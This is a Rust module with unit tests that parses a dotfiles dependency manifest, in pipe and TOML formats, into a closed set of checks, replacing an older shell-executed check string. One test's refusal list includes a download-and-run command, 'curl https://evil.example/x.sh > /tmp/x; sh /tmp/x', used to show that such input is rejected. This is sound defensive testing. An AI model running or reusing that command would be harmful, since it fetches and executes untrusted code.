use std::collections::BTreeSet;

use dotfiles_path::{CommandName, DocsUrl, GlobPattern, ModuleName, NameError, VersionFloor};

use crate::check::{Check, CheckParseError, parse_quoted_path};

/// The maximum byte length of a parsed dependency name.
///
/// Matches the bound `dotfiles-path` applies to its own names, for the same
/// reason: the text arrives from a file that can reach this crate without
/// passing pre-commit (spec 3.6).
const MAX_NAME_LEN: usize = 64;

/// The name of a manifest entry.
///
/// A separate type from `CommandName` because they are different
/// propositions: `neovim` is a dependency whose command is `nvim`, and
/// `pyyaml` is a dependency with no command at all.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
pub struct DependencyName(String);

impl DependencyName {
    /// # Errors
    ///
    /// Returns `NameError::NotPrintable` for a name outside
    /// `[A-Za-z0-9._-]`, which covers every one of the 22 real entries and
    /// excludes the `|` that would corrupt a re-serialized manifest.
    pub fn parse(raw: &str) -> Result<Self, NameError> {
        if raw.is_empty() {
            return Err(NameError::Empty);
        }
        if raw.len() > MAX_NAME_LEN {
            return Err(NameError::TooLong { len: raw.len(), max: MAX_NAME_LEN });
        }
        if raw.starts_with('-') {
            return Err(NameError::LeadingDash);
        }
        let allowed = |character: char| {
            character.is_ascii_alphanumeric() || matches!(character, '-' | '_' | '.')
        };
        if !raw.chars().all(allowed) {
            return Err(NameError::NotPrintable);
        }
        Ok(DependencyName(raw.to_string()))
    }

    /// The validated name.
    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl std::fmt::Display for DependencyName {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(formatter, "{}", self.0)
    }
}

/// Whether the conf file was chosen by platform detection or named
/// explicitly through `DEPS_CONF`.
///
/// Load-bearing rather than informational: spec 5.2 makes
/// `PythonImport` a parse error in a platform-selected file, so the sole
/// interpreter-spawning check can never reach the shell-startup path.
/// `deps-ci.conf:3-5` states that the file is selected only by an explicit
/// `DEPS_CONF`; nothing enforced it before.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ConfKind {
    /// Chosen by looking at the host, so nothing in the environment decided
    /// to load it. A check that spawns an interpreter is a parse error in
    /// such a file, which is what keeps that check off the shell-startup
    /// path.
    PlatformSelected,
    /// Named outright through `DEPS_CONF`, so a person chose this file for
    /// this run. That deliberate act is what permits the checks a
    /// platform-selected file may not carry.
    ExplicitOnly,
}

/// One manifest entry.
///
/// `docs` lives here rather than on `NoInstallReason`, per spec 5.1: the URL
/// already lives in the manifest and a second home is a drift shape.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ManifestEntry {
    /// How the dependency is referred to everywhere else: in a report, in
    /// the observation map, and in another entry's install plan. Unique
    /// across a manifest as a parse invariant.
    pub name: DependencyName,
    /// What counts as "present". A closed enum rather than a shell string,
    /// so a manifest edit cannot introduce a new command to run.
    pub check: Check,
    /// Where a reader goes when the check fails and no installer applies.
    /// Held on the entry rather than on the failure, because the manifest
    /// already carries it and a second home is a place for the two to drift.
    pub docs: DocsUrl,
}

/// The parsed manifest.
///
/// Order is the file's order, preserved because a report reads better in the
/// order the maintainer wrote. Uniqueness of names is a parse invariant, so
/// `get` cannot see two entries for one dependency.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Manifest {
    entries: Vec<ManifestEntry>,
}

impl Manifest {
    /// The entries, in the order the file listed them.
    pub fn entries(&self) -> &[ManifestEntry] {
        &self.entries
    }

    /// The entry for `name`, if the manifest has one.
    pub fn get(&self, name: &DependencyName) -> Option<&ManifestEntry> {
        self.entries.iter().find(|entry| &entry.name == name)
    }
}

/// Why a manifest was refused.
///
/// Every variant carries the 1-based line number, because the caller reports
/// a file it read and a message with no line is unactionable against a
/// 45-line conf file.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ParseError {
    /// The line did not split into the field count an entry needs, which is
    /// what a missing field or an unescaped separator looks like.
    WrongFieldCount {
        /// The 1-based line number, so the reader can open the file at it.
        line: usize,
        /// How many fields were actually found, which distinguishes a
        /// truncated line from one carrying an extra separator.
        found: usize,
    },
    /// The name field is not a usable dependency name.
    BadName {
        /// The 1-based line number, so the reader can open the file at it.
        line: usize,
        /// Which naming rule the field broke, so the report names the rule
        /// rather than saying only that the name is unusable.
        cause: NameError,
    },
    /// The check field does not describe a check this crate can perform.
    BadCheck {
        /// The 1-based line number, so the reader can open the file at it.
        line: usize,
        /// Whether the check kind was unknown or its argument was unusable,
        /// which are different edits to make.
        cause: CheckParseError,
    },
    /// The docs field is not a usable documentation URL.
    BadDocs {
        /// The 1-based line number, so the reader can open the file at it.
        line: usize,
        /// Which URL rule the field broke. Shares [`NameError`] with
        /// `BadName` because both fields are validated text, and the variant
        /// around it is what says which field is meant.
        cause: NameError,
    },
    /// Two entries claim one name. Rejected at parse rather than resolved by
    /// precedence, so no lookup can silently see one of two entries.
    DuplicateName {
        /// The 1-based line number of the *second* occurrence, which is the
        /// one to delete.
        line: usize,
        /// The repeated name, so the reader can find the first occurrence
        /// without rereading the file.
        name: DependencyName,
    },
    /// The text is not valid TOML at all. Distinct from every variant above,
    /// which describe a well-formed document saying something unusable: this
    /// one means the document did not parse, so no entry was reached.
    ///
    /// A repeated table (`[git]` twice) lands here rather than in
    /// `DuplicateName`, because TOML refuses it before this crate looks. The
    /// guarantee moved into the format, and the variant that carries it
    /// moved with it.
    MalformedToml {
        /// The parser's own message, which carries the line and column. Kept
        /// as text because the shape of a TOML syntax error is not something
        /// this crate models.
        message: String,
    },
    /// An entry carries a key this crate does not know.
    ///
    /// Refused rather than ignored, which is the whole reason to name the
    /// fields: `min_verison = "0.10"` silently dropped leaves a bare
    /// presence check that passes on exactly the versions the floor exists
    /// to reject.
    UnknownKey {
        /// The entry the key appeared in, so the report names a table rather
        /// than a line the reader has to count to.
        name: String,
        /// The key as written, so a typo is visible beside the correct
        /// spelling.
        key: String,
    },
}

/// Parse a TOML manifest into typed entries.
///
/// Takes `&str`, never a path, for the same reason [`parse_manifest`] does:
/// the caller reads the file, so this function makes no syscall and the
/// module holds no capability.
///
/// # The schema
///
/// One table per dependency, named by the dependency. Each table names
/// exactly one check plus a `docs` URL:
///
/// ```toml
/// [git]
/// command = "git"
/// docs = "https://git-scm.com/downloads"
///
/// [neovim]
/// command = "nvim"
/// min_version = "0.10"
/// docs = "https://neovim.io/"
///
/// [alacritty]
/// any_of = [{ dir = "/Applications/Alacritty.app" }, { command = "alacritty" }]
/// docs = "https://alacritty.org/"
/// ```
///
/// Check keys: `command`, `file`, `dir`, `file_non_empty`, `python_import`,
/// and `any_of` for an alternation. `min_version` qualifies `command` and is
/// not a check on its own.
///
/// # Why named keys
///
/// The pipe format wrote the check as one shell-shaped string, and its own
/// header documented the consequence: a check must not contain a literal
/// `|`, because the field split truncates it and leaks the remainder into
/// the docs URL. The version floor then packed a second value into that
/// same positionally-split string (`command -v nvim >=0.10`). Naming the
/// fields removes both problems by construction rather than by convention.
///
/// # Errors
///
/// Returns `ParseError`. `MalformedToml` means the document did not parse.
/// `UnknownKey` means an entry carried a key this crate does not know, which
/// is refused rather than ignored so a typo cannot silently drop a check.
/// `BadCheck` covers an entry naming no check, naming two, or naming one
/// whose argument is unusable.
pub fn parse_manifest_toml(text: &str, kind: ConfKind) -> Result<Manifest, ParseError> {
    let document: toml::Table = text
        .parse()
        .map_err(|error: toml::de::Error| ParseError::MalformedToml {
            message: error.to_string(),
        })?;

    let mut entries = Vec::new();
    for (raw_name, value) in &document {
        let name = DependencyName::parse(raw_name)
            // Line 0 rather than a real number: a TOML table has no single
            // line this crate can name without tracking spans, and reporting
            // a wrong line is worse than reporting none. The name is in the
            // error, which is what the reader searches for.
            .map_err(|cause| ParseError::BadName { line: 0, cause })?;

        let table = value
            .as_table()
            .ok_or(ParseError::BadCheck { line: 0, cause: CheckParseError::Unrecognized })?;

        let mut docs_field = None;
        let mut check_keys: Vec<&str> = Vec::new();
        for key in table.keys() {
            match key.as_str() {
                "docs" => docs_field = table.get(key).and_then(toml::Value::as_str),
                // `min_version` qualifies `command`; it is not a check of its
                // own, so it is not counted among the check keys. An entry
                // carrying only `min_version` therefore reports "no check"
                // rather than a confusing partial one.
                "min_version" => {}
                "command" | "file" | "dir" | "file_non_empty" | "glob" | "python_import"
                | "any_of" => {
                    check_keys.push(key.as_str());
                }
                other => {
                    return Err(ParseError::UnknownKey {
                        name: raw_name.clone(),
                        key: other.to_owned(),
                    });
                }
            }
        }

        // Exactly one, checked before anything is built. Two check keys is a
        // question with no answer -- resolving it by precedence would let a
        // lookup silently see one of two stated intents -- and zero means the
        // entry declares a dependency with no way to tell whether it is met.
        if check_keys.len() != 1 {
            return Err(ParseError::BadCheck { line: 0, cause: CheckParseError::Unrecognized });
        }

        let check = parse_toml_check(table, check_keys[0], kind)
            .map_err(|cause| ParseError::BadCheck { line: 0, cause })?;

        let raw_docs = docs_field.ok_or(ParseError::BadDocs { line: 0, cause: NameError::Empty })?;
        let docs = DocsUrl::parse(raw_docs)
            .map_err(|cause| ParseError::BadDocs { line: 0, cause })?;

        entries.push(ManifestEntry { name, check, docs });
    }

    // No DuplicateName pass. TOML refuses a repeated table itself, so the
    // document never reaches here carrying two entries for one name, and a
    // second check would be unreachable code asserting a guarantee the
    // format already gives.
    Ok(Manifest { entries })
}

/// One check, from the single check key its entry named.
fn parse_toml_check(
    table: &toml::Table,
    key: &str,
    kind: ConfKind,
) -> Result<Check, CheckParseError> {
    if key == "any_of" {
        let items = table
            .get("any_of")
            .and_then(toml::Value::as_array)
            .ok_or(CheckParseError::Unrecognized)?;
        // Two operands minimum. A one-item `any_of` is a leaf wearing an
        // alternation's clothes, and building `AnyOf` with an empty `rest`
        // would misreport the structure to every reader of the type.
        let (head, tail) = items.split_first().ok_or(CheckParseError::Unrecognized)?;
        if tail.is_empty() {
            return Err(CheckParseError::Unrecognized);
        }
        let first = parse_toml_branch(head, kind)?;
        let mut rest = Vec::new();
        for item in tail {
            rest.push(parse_toml_branch(item, kind)?);
        }
        return Ok(Check::AnyOf { first: Box::new(first), rest });
    }

    // `glob` is the one check carrying two values (a directory and a pattern
    // matched inside it), so it takes a table where the others take a string.
    // Handled before the string extraction below rather than inside it.
    if key == "glob" {
        let spec = table.get("glob").and_then(toml::Value::as_table).ok_or(CheckParseError::Unrecognized)?;
        for spec_key in spec.keys() {
            if spec_key != "dir" && spec_key != "pattern" {
                return Err(CheckParseError::Unrecognized);
            }
        }
        let raw_dir = spec.get("dir").and_then(toml::Value::as_str).ok_or(CheckParseError::Unrecognized)?;
        let raw_pattern =
            spec.get("pattern").and_then(toml::Value::as_str).ok_or(CheckParseError::Unrecognized)?;
        let dir = parse_quoted_path(raw_dir)?;
        let pattern = GlobPattern::parse(raw_pattern).map_err(CheckParseError::BadGlob)?;
        return Ok(Check::GlobExists { dir, pattern });
    }

    let value = table.get(key).and_then(toml::Value::as_str).ok_or(CheckParseError::Unrecognized)?;

    match key {
        "command" => match table.get("min_version") {
            Some(floor_value) => {
                let raw_floor =
                    floor_value.as_str().ok_or(CheckParseError::Unrecognized)?;
                let name =
                    CommandName::parse(value).map_err(CheckParseError::BadCommandName)?;
                let floor =
                    VersionFloor::parse(raw_floor).map_err(CheckParseError::BadVersionFloor)?;
                Ok(Check::CommandVersion { name, floor })
            }
            None => Ok(Check::Command(
                CommandName::parse(value).map_err(CheckParseError::BadCommandName)?,
            )),
        },
        "file" => Ok(Check::FileExists(parse_quoted_path(value)?)),
        "dir" => Ok(Check::DirExists(parse_quoted_path(value)?)),
        "file_non_empty" => Ok(Check::FileNonEmpty(parse_quoted_path(value)?)),
        "python_import" => {
            // The rule the pipe parser enforced, carried across formats
            // unchanged: a python import spawns an interpreter, so it is
            // permitted only in a file a caller named explicitly. A
            // platform-selected file is chosen by the machine, not by the
            // caller, so it may not grant that.
            if kind != ConfKind::ExplicitOnly {
                return Err(CheckParseError::InterpreterCheck);
            }
            Ok(Check::PythonImport(ModuleName::parse(value).map_err(CheckParseError::BadModuleName)?))
        }
        _ => Err(CheckParseError::Unrecognized),
    }
}

/// One branch of an `any_of`, which is an inline table naming one check.
fn parse_toml_branch(value: &toml::Value, kind: ConfKind) -> Result<Check, CheckParseError> {
    let table = value.as_table().ok_or(CheckParseError::Unrecognized)?;
    let mut check_keys: Vec<&str> = Vec::new();
    for key in table.keys() {
        match key.as_str() {
            "min_version" => {}
            "command" | "file" | "dir" | "file_non_empty" | "glob" | "python_import" => {
                check_keys.push(key.as_str());
            }
            // No nested `any_of`, and no `docs` on a branch. Flat by design:
            // every real alternation in these manifests is one level deep,
            // and a nested one would be an alternation of alternations,
            // which reads worse than the flat list it is equivalent to.
            _ => return Err(CheckParseError::Unrecognized),
        }
    }
    if check_keys.len() != 1 {
        return Err(CheckParseError::Unrecognized);
    }
    parse_toml_check(table, check_keys[0], kind)
}

/// Parse pipe-delimited manifest text into typed entries.
///
/// The format this crate is migrating OFF: `name|check_command|docs_url`.
/// Retained so `parse_manifest_toml` can be checked against it entry by
/// entry, and so a `.conf` file that has not been converted still reads.
/// New entries go in the TOML form.
///
/// Takes `&str`, never a path: the caller reads the file, so this function
/// makes no syscall and the module holds no capability. It is the boundary
/// spec 3.6 requires, replacing the `sh -c "$check"` at
/// `retired-check-deps:524` with a closed enum that has no shell escape hatch.
///
/// # Errors
///
/// Returns `ParseError` naming the 1-based line and the rule it broke. A
/// line with more than three pipe-separated fields is `WrongFieldCount`
/// rather than a silent truncation, which is the failure the pipe format's
/// own header documented and could not detect.
pub fn parse_manifest(text: &str, kind: ConfKind) -> Result<Manifest, ParseError> {
    let mut entries = Vec::new();
    let mut seen: BTreeSet<DependencyName> = BTreeSet::new();

    for (index, raw_line) in text.lines().enumerate() {
        let line = index + 1;
        let trimmed = raw_line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }

        let fields: Vec<&str> = trimmed.split('|').collect();
        let [raw_name, raw_check, raw_docs] = fields.as_slice() else {
            return Err(ParseError::WrongFieldCount { line, found: fields.len() });
        };

        let name = DependencyName::parse(raw_name)
            .map_err(|cause| ParseError::BadName { line, cause })?;
        let check = parse_check(raw_check, kind, line)?;
        let docs = DocsUrl::parse(raw_docs)
            .map_err(|cause| ParseError::BadDocs { line, cause })?;

        if !seen.insert(name.clone()) {
            return Err(ParseError::DuplicateName { line, name });
        }
        entries.push(ManifestEntry { name, check, docs });
    }

    Ok(Manifest { entries })
}

/// Recognize a check expression, tagging the failure with its line.
///
/// The grammar itself lives in `check`, so `parse_manifest` owns the line
/// accounting and the check module owns the shapes. `ParseError::BadCheck`
/// wraps the grammar's own error rather than flattening it, because a report
/// that says which rule broke is what makes a 45-line conf file actionable.
fn parse_check(raw: &str, kind: ConfKind, line: usize) -> Result<Check, ParseError> {
    crate::check::parse_check_expression(raw, kind)
        .map_err(|cause| ParseError::BadCheck { line, cause })
}

#[cfg(test)]
mod tests {
    use dotfiles_path::CommandName;

    use super::*;

    fn name(raw: &str) -> DependencyName {
        DependencyName::parse(raw).expect("a test dependency name parses")
    }

    fn command_name(raw: &str) -> CommandName {
        CommandName::parse(raw).expect("a test command name parses")
    }

    // The real shared manifest, verbatim from deps.conf. Comment lines and
    // blank lines are skipped; the format is name|check|docs.
    const REAL_SHARED_HEAD: &str = "\
# CLI dependencies shared by every machine, regardless of platform.
# Format: name|check_command|docs_url

git|command -v git|https://git-scm.com/downloads
gh|command -v gh|https://cli.github.com/
tpm|[ -d \"$HOME/.tmux/plugins/tpm\" ]|https://github.com/tmux-plugins/tpm
";

    #[test]
    fn parses_the_real_shared_manifest_head() {
        let manifest = parse_manifest(REAL_SHARED_HEAD, ConfKind::PlatformSelected)
            .expect("the real deps.conf head parses");
        assert_eq!(manifest.entries().len(), 3);
        assert_eq!(manifest.entries()[0].name.as_str(), "git");
        assert_eq!(
            manifest.entries()[0].docs.as_str(),
            "https://git-scm.com/downloads"
        );
        assert_eq!(
            manifest.entries()[0].check,
            Check::Command(CommandName::parse("git").expect("git is a name"))
        );
    }

    // deps.conf:9-13 warns that a literal `|` in the check field truncates
    // the check and leaks the remainder into docs_url. Under `IFS='|' read`
    // that is silent. Here it is an error, which is the point of the port.
    // `found` is 5, not 4: `||` is two pipe bytes, so the line splits into
    // five fields, one of them the empty string between them. Confirmed
    // against the shell this replaces: `IFS='|' read -r name check docs` on
    // this exact line yields check=`command -v gh ` and
    // docs=`| true|https://cli.github.com/`, which is the silent corruption
    // deps.conf:9-13 documents and cannot detect.
    #[test]
    fn rejects_a_line_with_an_extra_pipe() {
        let text = "gh|command -v gh || true|https://cli.github.com/\n";
        assert!(matches!(
            parse_manifest(text, ConfKind::PlatformSelected),
            Err(ParseError::WrongFieldCount { line: 1, found: 5 })
        ));
    }

    // A single extra pipe, which is the four-field case the `||` line above
    // is not. Both must be refused, and the count must be the real one.
    #[test]
    fn rejects_a_line_with_one_extra_pipe() {
        let text = "gh|command -v gh | true|https://cli.github.com/\n";
        assert!(matches!(
            parse_manifest(text, ConfKind::PlatformSelected),
            Err(ParseError::WrongFieldCount { line: 1, found: 4 })
        ));
    }

    #[test]
    fn rejects_a_line_with_a_missing_field() {
        let text = "gh|command -v gh\n";
        assert!(matches!(
            parse_manifest(text, ConfKind::PlatformSelected),
            Err(ParseError::WrongFieldCount { line: 1, found: 2 })
        ));
    }

    // A duplicate name means two entries claim one dependency, and the
    // later one silently wins under the shell loop.
    #[test]
    fn rejects_a_duplicate_name() {
        let text = "\
git|command -v git|https://git-scm.com/downloads
git|command -v git|https://git-scm.com/downloads
";
        assert!(matches!(
            parse_manifest(text, ConfKind::PlatformSelected),
            Err(ParseError::DuplicateName { line: 2, .. })
        ));
    }

    // deps-ci.conf:23 uses http://, so a manifest holding it must parse.
    #[test]
    fn accepts_the_one_plain_http_docs_url() {
        let text = "dash|command -v dash|http://gondor.apana.org.au/~herbert/dash/\n";
        let manifest = parse_manifest(text, ConfKind::ExplicitOnly)
            .expect("deps-ci.conf:23 must parse");
        assert_eq!(
            manifest.entries()[0].docs.as_str(),
            "http://gondor.apana.org.au/~herbert/dash/"
        );
    }

    #[test]
    fn get_finds_an_entry_by_name() {
        let manifest = parse_manifest(REAL_SHARED_HEAD, ConfKind::PlatformSelected)
            .expect("the real deps.conf head parses");
        let wanted = DependencyName::parse("tpm").expect("tpm is a name");
        assert!(manifest.get(&wanted).is_some());
        let absent = DependencyName::parse("nvm").expect("nvm is a name");
        assert!(manifest.get(&absent).is_none());
    }

    // parse takes &str, never a path. This test is the no-IO claim for
    // this module: a caller reads the file, and doctor.rs:1-6 is the
    // in-repo precedent for the shape.
    #[test]
    fn parse_is_a_function_of_text_alone() {
        let first = parse_manifest(REAL_SHARED_HEAD, ConfKind::PlatformSelected)
            .expect("the real deps.conf head parses");
        let second = parse_manifest(REAL_SHARED_HEAD, ConfKind::PlatformSelected)
            .expect("the real deps.conf head parses");
        assert_eq!(first.entries(), second.entries());
    }

    /// Every check shape in the tracked conf files parses, and this pins
    /// which shapes still do not.
    ///
    /// Task 7's version of this test asserted the opposite: that
    /// `[ -s "$HOME/.nvm/nvm.sh" ]` failed as `Unrecognized`, because
    /// `parse_check` then knew only `command -v` and `[ -d ... ]`. Task 8
    /// implemented the grammar, so that assertion went red, which is what it
    /// existed to do. The boundary it guards has moved rather than
    /// disappeared: the grammar is closed, so the shapes OUTSIDE it are now
    /// what needs pinning, and a future shell one-liner added to a conf file
    /// must fail here rather than silently reach a `sh -c`.
    ///
    /// Without this test the guarantee is invisible: every other unit test
    /// feeds `parse_manifest` a hand-written line, so the suite would stay
    /// green while the parser could not read the file it exists to read.
    #[test]
    fn every_real_check_shape_parses_and_the_grammar_stays_closed() {
        // One line per distinct check shape in the four tracked conf files,
        // verbatim. deps.conf:22, :24, :26, :32, :36, :45, deps-linux.conf:11
        // and deps-ci.conf:22, which between them cover all seven variants.
        let real_shapes = "\
git|command -v git|https://git-scm.com/downloads
alacritty|if test -d /Applications/Alacritty.app; then true; else command -v alacritty; fi|https://alacritty.org/
zsh-autosuggestions|test -f \"$HOME/.oh-my-zsh/custom/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh\" -o -f \"$(brew --prefix 2>/dev/null)/share/zsh-autosuggestions/zsh-autosuggestions.zsh\"|https://github.com/zsh-users/zsh-autosuggestions
tpm|[ -d \"$HOME/.tmux/plugins/tpm\" ]|https://github.com/tmux-plugins/tpm
nvm|[ -s \"$HOME/.nvm/nvm.sh\" ]|https://github.com/nvm-sh/nvm
node|if command -v node; then true; else ls -d \"$HOME/.nvm/versions/node\"/v* >/dev/null 2>&1; fi|https://nodejs.org/
oh-my-zsh|[ -d \"$HOME/.oh-my-zsh\" ]|https://ohmyz.sh/
pyyaml|python3 -c \"import yaml\"|https://pyyaml.org/
";
        let parsed = parse_manifest(real_shapes, ConfKind::ExplicitOnly)
            .expect("every shape in the tracked conf files parses");
        assert_eq!(parsed.entries.len(), 8);

        // The seven variants, so a future collapse of two into one is a
        // failure here rather than a silent behavior change.
        let variants: Vec<&Check> = parsed.entries.iter().map(|entry| &entry.check).collect();
        assert!(matches!(variants[0], Check::Command(_)));
        assert!(matches!(variants[1], Check::AnyOf { .. }));
        assert!(matches!(variants[2], Check::AnyOf { .. }));
        assert!(matches!(variants[3], Check::DirExists(_)));
        assert!(matches!(variants[4], Check::FileNonEmpty(_)));
        assert!(matches!(variants[5], Check::AnyOf { .. }));
        assert!(matches!(variants[6], Check::DirExists(_)));
        assert!(matches!(variants[7], Check::PythonImport(_)));
        // The -o alternation's own branches, because FileExists appears
        // only inside one and would otherwise go unasserted.
        let Check::AnyOf { first, rest } = variants[2] else {
            panic!("deps.conf:26 is an alternation");
        };
        assert!(matches!(first.as_ref(), Check::FileExists(_)));
        assert!(matches!(rest.as_slice(), [Check::FileExists(_)]));

        // The boundary that remains. None of these appears in a tracked conf
        // file today, and each must be an error rather than a fallthrough to
        // a shell. `Unrecognized` here IS the no-escape-hatch guarantee.
        //
        // These go through parse_check_expression rather than through
        // parse_manifest, because a shell one-liner usually carries a `|` and
        // that is caught one layer earlier by WrongFieldCount, at the field
        // split. Routing them through the manifest would test field counting
        // and prove nothing about the grammar. The pipe-bearing case has its
        // own test above: rejects_a_line_with_an_extra_pipe.
        let outside_the_grammar = [
            "curl https://evil.example/x.sh > /tmp/x; sh /tmp/x",
            "[ -x \"$HOME/bin/thing\" ]",
            "[ -d \"$(pwd)/x\" ]",
            "test -f \"$XDG_CONFIG_HOME/x\"",
            "if command -v a; then true; elif command -v b; then true; else command -v c; fi",
        ];
        for raw in outside_the_grammar {
            let refused = crate::check::parse_check_expression(raw, ConfKind::ExplicitOnly)
                .expect_err("a shape outside the grammar must not parse");
            assert_eq!(
                refused,
                CheckParseError::Unrecognized,
                "expected {raw} to be Unrecognized"
            );
        }
    }

// --- TOML manifest parsing --------------------------------------------

    #[test]
    fn a_command_entry_parses_from_toml() {
    let manifest = parse_manifest_toml(
        r#"
[git]
command = "git"
docs = "https://git-scm.com/downloads"
"#,
        ConfKind::PlatformSelected,
    )
    .expect("a command entry parses");
    let entry = manifest.get(&name("git")).expect("git is present");
    assert_eq!(entry.check, Check::Command(command_name("git")));
}

    #[test]
    fn a_version_floor_is_its_own_key_rather_than_packed_into_a_string() {
    // The pipe format wrote `command -v nvim >=0.10`, so the floor was a
    // second field inside a positionally-split string. Named keys are the
    // whole point of the conversion.
    let manifest = parse_manifest_toml(
        r#"
[neovim]
command = "nvim"
min_version = "0.10"
docs = "https://neovim.io/"
"#,
        ConfKind::PlatformSelected,
    )
    .expect("a floor entry parses");
    let entry = manifest.get(&name("neovim")).expect("neovim is present");
    match &entry.check {
        Check::CommandVersion { name: command, floor } => {
            assert_eq!(command, &command_name("nvim"));
            assert_eq!(floor.components(), (0, 10, 0));
        }
        other => panic!("expected CommandVersion, got {other:?}"),
    }
}

    #[test]
    fn a_check_may_not_name_two_kinds_at_once() {
    // The failure the pipe format could not express, let alone reject: an
    // entry that is both a command check and a directory check. Refused
    // rather than resolved by precedence, so no lookup silently sees one of
    // two intents.
    let error = parse_manifest_toml(
        r#"
[confused]
command = "git"
dir = "$HOME/.config"
docs = "https://example.invalid/"
"#,
        ConfKind::PlatformSelected,
    )
    .expect_err("two check kinds in one entry are refused");
    assert!(
        matches!(error, ParseError::BadCheck { .. }),
        "expected BadCheck, got {error:?}"
    );
}

    #[test]
    fn an_entry_naming_no_check_is_refused() {
    let error = parse_manifest_toml(
        r#"
[empty]
docs = "https://example.invalid/"
"#,
        ConfKind::PlatformSelected,
    )
    .expect_err("an entry with no check is refused");
    assert!(
        matches!(error, ParseError::BadCheck { .. }),
        "expected BadCheck, got {error:?}"
    );
}

    #[test]
    fn a_pipe_in_a_check_is_now_expressible() {
    // The defect the format's own header documented: a literal `|` in a
    // check truncated the field and leaked the remainder into docs_url. In
    // TOML it is just a character in a string, so the value survives.
    //
    // A shell pipe is not a check this crate performs, so the assertion is
    // that the parser REPORTS the unknown kind rather than corrupting the
    // entry. Refusing an unsupported check and silently mangling one are
    // different outcomes, and only the first is safe.
    let error = parse_manifest_toml(
        r#"
[piped]
command = "a | b"
docs = "https://example.invalid/"
"#,
        ConfKind::PlatformSelected,
    )
    .expect_err("a pipe is not a command name");
    assert!(
        matches!(error, ParseError::BadCheck { .. }),
        "expected BadCheck naming the bad command name, got {error:?}"
    );
}

    #[test]
    fn an_any_of_check_parses_from_a_list() {
    // The `if ...; then true; else ...; fi` and `test A -o B` shapes both
    // encoded one proposition: any of these. A list says it directly.
    let manifest = parse_manifest_toml(
        r#"
[alacritty]
any_of = [
    { dir = "/Applications/Alacritty.app" },
    { command = "alacritty" },
]
docs = "https://alacritty.org/"
"#,
        ConfKind::PlatformSelected,
    )
    .expect("an any_of entry parses");
    let entry = manifest.get(&name("alacritty")).expect("alacritty is present");
    match &entry.check {
        Check::AnyOf { rest, .. } => assert_eq!(rest.len(), 1),
        other => panic!("expected AnyOf, got {other:?}"),
    }
}

    #[test]
    fn a_python_import_is_refused_in_a_platform_selected_file() {
    // The rule the pipe parser already enforced, preserved across formats:
    // a PythonImport spawns an interpreter, so it is permitted only in a
    // file selected by an explicit DEPS_CONF.
    let error = parse_manifest_toml(
        r#"
[pyyaml]
python_import = "yaml"
docs = "https://pyyaml.org/"
"#,
        ConfKind::PlatformSelected,
    )
    .expect_err("a python import needs an explicit conf file");
    assert!(
        matches!(error, ParseError::BadCheck { .. }),
        "expected BadCheck, got {error:?}"
    );

    parse_manifest_toml(
        r#"
[pyyaml]
python_import = "yaml"
docs = "https://pyyaml.org/"
"#,
        ConfKind::ExplicitOnly,
    )
    .expect("an explicit-only file may carry a python import");
}

    #[test]
    fn a_duplicate_table_is_refused_by_toml_itself() {
    // The pipe parser needed its own DuplicateName check because two lines
    // could name one dependency. TOML rejects a repeated table before this
    // crate sees it, so the guarantee moves into the format.
    let error = parse_manifest_toml(
        r#"
[git]
command = "git"
docs = "https://example.invalid/a"

[git]
command = "git"
docs = "https://example.invalid/b"
"#,
        ConfKind::PlatformSelected,
    )
    .expect_err("a duplicate table is refused");
    assert!(
        matches!(error, ParseError::MalformedToml { .. }),
        "expected MalformedToml, got {error:?}"
    );
}

    #[test]
    fn an_unknown_key_is_refused_rather_than_ignored() {
    // A typo in a key name must not silently drop the check it meant to
    // declare. `min_verison = "0.10"` ignored would leave a bare presence
    // check that passes on the version the floor exists to reject, which is
    // the exact bug the floor was added for.
    let error = parse_manifest_toml(
        r#"
[neovim]
command = "nvim"
min_verison = "0.10"
docs = "https://neovim.io/"
"#,
        ConfKind::PlatformSelected,
    )
    .expect_err("an unknown key is refused");
    assert!(
        matches!(error, ParseError::UnknownKey { .. }),
        "expected UnknownKey, got {error:?}"
    );
}
}
